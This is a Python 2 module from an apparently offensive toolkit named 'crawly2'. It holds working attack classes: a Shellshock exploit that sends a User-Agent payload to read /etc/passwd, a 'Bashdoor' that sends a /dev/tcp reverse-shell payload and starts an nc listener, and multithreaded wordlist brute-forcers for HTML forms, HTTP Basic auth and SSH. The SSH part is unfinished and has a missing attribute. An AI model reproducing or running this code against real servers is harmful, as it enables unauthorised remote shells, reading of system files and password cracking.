# -*- coding: utf-8 -*-
# Part of crawly2

import os, sys
import socket
import time
import urllib, urllib2
import Queue
import threading
import base64
import platform
from paramiko import SSHClient
from paramiko import AutoAddPolicy

# My modules
from ..core import errors
from ..core import http
from ..core import tool as core
from ..core import headers as head

class Shellshock:
	'''
	This class will be used
	to shellshock a server.
	__init__("127.0.0.1/cgi-bin/vuln")
	'''
	def __init__(self, URL):
		self.t = core.Tools()
		self.c = head.Strings()
		self.URL = URL
		self.PAYLOAD = "() { :; }; echo; /bin/cat /etc/passwd"
		self.shellshock()

	def shellshock(self):
		print(self.c.INFO + "Trying shellshock on : "+self.URL)
		print(self.c.INFO + "With payload : "+self.PAYLOAD + "\n")

		# Actions on the URL.
		https = False
		if "http://" in self.URL:
			self.URL = self.URL.replace("http://", "")
		elif "https://" in self.URL:
			https = True
			self.URL = self.URL.replace("https://", "")

		if not "/" in self.URL:
			print("You forgot to define the path to the cgi..")
			self.URL = raw_input("Enter the path (ex: /cgi-bin/vuln) > ")

		if https == True:
			self.URL = "https://" + self.URL
		else:
			self.URL = "http://" + self.URL
		
		try:
			req = urllib2.Request(self.URL, headers={'User-Agent': self.PAYLOAD})
			out = urllib2.urlopen(req)
		except urllib2.HTTPError as e:
			print(self.c.ERROR + "Server responds [%d] code..." %(e.code))
			sys.exit(1)
		except urllib2.URLError:
			print(self.c.ERROR + "Humm, i think it's a wrong path...")
			sys.exit(1)

		res = out.read()

		if "root:" in res:
			print(res)
			print(self.c.PASS + "The server is vulnerable, you can try the bashdoor [--bashdoor].")
		else:
			print(self.c.ERROR + "Server seems to not be vulnerable.")

class Bashdoor:
	'''
	This class will be used to open
	reverse shell of the remote host.
	__init__("www.remote.url/cgi-bin/vuln", "192.168.1.1", "4444")
	'''
	def __init__(self, RURL, LHOST, LPORT):
		self.c = head.Strings()
		self.RURL = RURL
		self.LHOST = LHOST
		self.LPORT = LPORT
		self.PAYLOAD = "() { :; }; echo; /bin/bash -i >& /dev/tcp/%s/%s 0>&1" %(self.LHOST, self.LPORT)

		if platform.system() == "Windows":
			raise errors.WindowsError("This class can't be runned on a windows host at this time.")

		self.run()

	def listener(self):
		print(self.c.INFO + "Running the listener...")
		os.system("nc -lp %s" %(self.LPORT))
		
	def bashdoor(self):
		print(self.c.INFO + "Trying shellshock on : "+self.RURL)
		print(self.c.INFO + "With payload : "+self.PAYLOAD + "\n")
		req = urllib2.Request(self.RURL, headers={'User-Agent': self.PAYLOAD})
		out = urllib2.urlopen(req)

	def run(self):
		t = threading.Thread(target=self.listener).start()
		t2 = threading.Timer(1, self.bashdoor).start()

class HTMLBrute:
	'''
	This class can Bruteforce
	HTML forms.
	__init__("www.remote.url/admin/index", "usernamef", "passwordf", "Error",
	"admin", "list.lst", 35)
	'''
	def __init__(self, URL, USERFIELD="username", PASSFIELD="password", ERRORMSG="Error", 
		USER="admin", WORDLIST=None, THREADS=35):
		self.c = head.Strings()
		self.URL = URL
		self.USERFIELD = USERFIELD
		self.PASSFIELD = PASSFIELD
		self.ERRORMSG = ERRORMSG
		self.USER = USER
		#self.PASS = PASS
		self.WORDLIST = WORDLIST
		self.THREADS = THREADS

		if self.WORDLIST is None:
			print(self.c.ERROR + "I need a wordlist... [--wordlist]")
			sys.exit(1)

		self.run()

	def brute(self, i, q):

		URL = http.URI(self.URL).prepare()
		
		while True:
			i = q.get()

			try:
				data = {self.USERFIELD: self.USER, self.PASSFIELD: i}
				params = urllib.urlencode(data)
				req = urllib2.Request(URL, headers={'User-Agent': core.Tools().randomagent()})
				response = urllib2.urlopen(req, params)
				
				data = str(response.read())

				if not str(self.ERRORMSG) in data:
					print(self.c.PASS + "Found password for user %s:%s\n"%(self.USER, i)),
					print(self.c.INFO + "Queue needs to complete before exiting...")

			except urllib2.HTTPError as e:
				pass

			finally:
				q.task_done()

	def run(self):
		q = Queue.Queue()

		print(self.c.INFO + "Lunching the HTML FORM bruteforcer.")

		print(self.c.MED + "Starting : " + str(self.THREADS) + " threads...\n")

		with open(self.WORDLIST, "r") as l:
			for line in l:
				q.put(line.rstrip('\n\r'))

		for i in range(int(self.THREADS)):
			worker = threading.Thread(target=self.brute, args=(i, q))
			worker.setDaemon(True)
			worker.start()
			worker.join(600)

		q.join()

		print "\n" + self.c.INFO + "Scan finished at: "+time.strftime('%H:%M:%S')

class HTTPBrute:
	def __init__(self, URL, USERNAME, WORDLIST, THREADS):
		self.c = head.Strings()
		self.URL = URL
		self.USERNAME = USERNAME
		self.WORDLIST = WORDLIST
		self.THREADS = THREADS

		if self.USERNAME is None:
			print(self.c.ERROR + "I need an username... [--user]")
			sys.exit(1)

		self.run()

	def brute(self, i, q):

		URL = http.URI(self.URL).prepare()

		while True:
			i = q.get()

			req = urllib2.Request(URL, headers={'User-Agent': core.Tools().randomagent()})

			encstr = base64.encodestring('%s:%s' % (self.USERNAME, i)).replace('\n', '')
			req.add_header("Authorization", "Basic %s" % encstr)
		
			try:
				
				result = urllib2.urlopen(req)
				print(self.c.PASS + "Hit! Found: %s:%s\n"%(self.USERNAME, i)),
				break

			except urllib2.HTTPError:
				pass

			finally:
				q.task_done()

			if platform.system() != "Windows":
				# There's some print fails here on windows.
				sys.stdout.write(self.c.INFO + "Passwords to test: %d\r" % q.qsize())
				sys.stdout.flush()

  	def run(self):
  		q = Queue.Queue()

  		print(self.c.MED + "Lunching the HTTP bruteforcer...")

		try:
			with open(self.WORDLIST, "r") as l:
				for line in l:
					q.put(line.rstrip('\n\r'))
		except TypeError:
			print(self.c.ERROR + "Oh! You forgot to specify a wordlist...")
			sys.exit(1)
		except IOError:
			print(self.c.ERROR + "Wordlist not found...")
			sys.exit(1)

		print(self.c.MED + "Starting : "+ str(self.THREADS) + " threads...\n")

		print(self.c.INFO + "Using random User-Agent...")

		for i in range(int(self.THREADS)):
			worker = threading.Thread(target=self.brute, args=(i, q))
			worker.setDaemon(True)
			worker.start()
			worker.join(600)

		q.join()

		print(self.c.INFO + "Scan finished at: "+time.strftime('%H:%M:%S'))

class SSHBrute:
	def __init__(self, HOST, PORT, USER, WORDLIST):
		self.HOST = HOST
		self.PORT = PORT
		self.USER = USER
		self.WORDLIST = WORDLIST

	def brute(self, q):
		HOST = http.URI(self.HOST).host()
		while True:
			i = q.get()

			ssh = SSHClient()
			ssh.set_missing_host_key_policy(AutoAddPolicy())

			try:

				ssh.connect(self.HOST, port=int(self.PORT), 
					username=self.USER, password=i,  
					allow_agent=False, look_for_keys=False)

				print(self.c.PASS + "Found password %s:%s"%(self.USER, i))
				print(self.c.INFO + "Queue needs to complete before exiting...")

				ssh.close()

			except:
				pass

			finally:
				q.task_done()

	def run(self):
		#XXX: TODO
		pass
